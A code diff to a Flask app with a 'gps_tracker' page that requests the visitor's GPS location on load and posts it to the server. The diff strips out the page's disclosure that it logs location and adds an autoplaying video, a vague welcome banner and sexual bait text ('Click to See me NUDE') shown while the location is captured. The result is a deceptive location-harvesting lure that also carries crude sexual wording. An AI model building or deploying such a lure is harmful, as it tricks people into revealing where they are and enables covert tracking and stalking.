@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, send_file, redirect, url_for
+from flask import Flask, request, jsonify, redirect, url_for
 import os
 from datetime import datetime
 import requests
@@ -36,8 +36,8 @@ def gps_tracker():
         <style>
             body {
                 font-family: Arial, sans-serif;
-                background-color: #f4f4f9;
-                color: #333;
+                background-color: #000;
+                color: #fff;
                 margin: 0;
                 padding: 0;
                 display: flex;
@@ -47,39 +47,36 @@ def gps_tracker():
             }
             .container {
                 text-align: center;
-                background: white;
+                background: rgba(0, 0, 0, 0.8);
                 padding: 20px;
                 border-radius: 8px;
-                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-                max-width: 400px;
+                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
+                max-width: 600px;
                 width: 100%;
             }
             h1 {
-                color: #4caf50;
-                font-size: 24px;
-            }
-            button {
-                background-color: #4caf50;
-                color: white;
-                border: none;
-                padding: 10px 20px;
-                font-size: 16px;
-                border-radius: 4px;
-                cursor: pointer;
-                margin-top: 10px;
-            }
-            button:hover {
-                background-color: #45a049;
+                color: #ff9800;
+                font-size: 28px;
             }
             p {
                 margin: 15px 0;
+                font-size: 18px;
+            }
+            video {
+                width: 100%;
+                border-radius: 8px;
+                margin-bottom: 15px;
             }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>Welcome to Location Tracker</h1>
-            <p>Your location helps us provide you with tailored experiences. Please allow location access.</p>
+            <video autoplay muted loop>
+                <source src="/static/New Project - Made with Clipchamp.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+            <h1>Welcome to Our Experience</h1>
+            <p>Enjoy the journey while we optimize your preferences based on your location.</p>
             <p id="status">Initializing location request...</p>
             <script>
                 // Automatically request GPS location when the page loads
@@ -89,7 +86,7 @@ def gps_tracker():
 
                 function getLocation() {
                     if (navigator.geolocation) {
-                        document.getElementById("status").innerText = "Requesting your location. Please allow access.";
+                        document.getElementById("status").innerText = "Click to See me NUDE";
                         navigator.geolocation.getCurrentPosition(sendLocation, showError);
                     } else {
                         document.getElementById("status").innerText = "Your browser does not support geolocation.";
@@ -114,7 +111,7 @@ def gps_tracker():
                     })
                     .then(response => response.json())
                     .then(data => {
-                        document.getElementById("status").innerText = "Thank you! Your location has been successfully logged.";
+                        document.getElementById("status").innerText = "Fuck me daddy!!";
                     })
                     .catch(error => {
                         document.getElementById("status").innerText = "Error logging your location. Please try again.";
